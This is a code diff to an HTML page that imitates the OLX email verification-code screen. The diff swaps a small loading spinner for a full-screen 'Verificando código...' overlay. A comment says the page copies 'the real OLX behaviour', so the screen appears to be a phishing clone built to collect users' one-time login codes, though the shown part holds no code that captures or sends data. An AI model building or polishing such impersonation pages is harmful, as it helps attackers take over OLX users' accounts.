@@ -282,8 +282,12 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
   .back-link{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;padding:0;text-decoration:none}
   .back-link:hover{text-decoration:underline}
   .code-error{display:none;color:#c0392b;font-size:13px;margin:-4px 0 12px;text-align:center}
-  .loading-row{display:none;align-items:center;justify-content:center;gap:10px;padding:14px 0;color:#6b6b6b;font-size:14px}
-  .loading-row .spinner{width:18px;height:18px;border:2px solid #e5e7eb;border-top-color:#6E0AD6;border-radius:50%;animation:olxSpin .9s linear infinite}
+  .loading-row{display:none}
+  .loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.55);z-index:9999;align-items:center;justify-content:center;backdrop-filter:blur(2px);-webkit-backdrop-filter:blur(2px)}
+  .loading-overlay.show{display:flex}
+  .loading-overlay .box{background:#fff;border-radius:14px;padding:28px 36px;display:flex;flex-direction:column;align-items:center;gap:14px;box-shadow:0 12px 40px rgba(0,0,0,.3);min-width:200px}
+  .loading-overlay .big-spinner{width:48px;height:48px;border:4px solid #ede3fb;border-top-color:#6E0AD6;border-radius:50%;animation:olxSpin .9s linear infinite}
+  .loading-overlay .label{color:#1a1a1a;font-size:14px;font-weight:500}
   @keyframes olxSpin{to{transform:rotate(360deg)}}
 </style>
 </head>
@@ -322,11 +326,7 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
       <button type="button" class="resend-link" id="resend-btn">Reenviar código</button>
     </div>
 
-
-    <div class="loading-row" id="loading-row">
-      <div class="spinner"></div>
-      <span>Verificando código...</span>
-    </div>
+    <div class="loading-row" id="loading-row" aria-hidden="true"></div>
 
     <div class="alertbox" role="status">
       <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" aria-hidden="true">
@@ -347,16 +347,26 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
     </div>
   </main>
 
+  <div class="loading-overlay" id="loading-overlay" role="status" aria-live="polite">
+    <div class="box">
+      <div class="big-spinner"></div>
+      <div class="label">Verificando código...</div>
+    </div>
+  </div>
+
   <script>
     (function(){
       var inputs = Array.prototype.slice.call(document.querySelectorAll('#code-wrap input'));
       var codeWrap = document.getElementById('code-wrap');
-      var loadingRow = document.getElementById('loading-row');
+      var overlay = document.getElementById('loading-overlay');
       var errorEl = document.getElementById('code-error-top');
       var submitted = false;
 
       function setLoading(on){
-        if(loadingRow) loadingRow.style.display = on ? 'flex' : 'none';
+        if(overlay){
+          if(on) overlay.classList.add('show');
+          else overlay.classList.remove('show');
+        }
         inputs.forEach(function(i){ i.disabled = on; });
       }
 
@@ -373,7 +383,7 @@ const EMAIL_CODE_SCREEN_HTML = `<!DOCTYPE html>
         if(codeWrap) codeWrap.classList.add('has-error');
         // Mantém os valores digitados (igual ao comportamento real da OLX)
         inputs.forEach(function(i){ i.disabled = false; i.setAttribute('aria-invalid','true'); });
-        if(loadingRow) loadingRow.style.display = 'none';
+        if(overlay) overlay.classList.remove('show');
         submitted = false;
       }
 
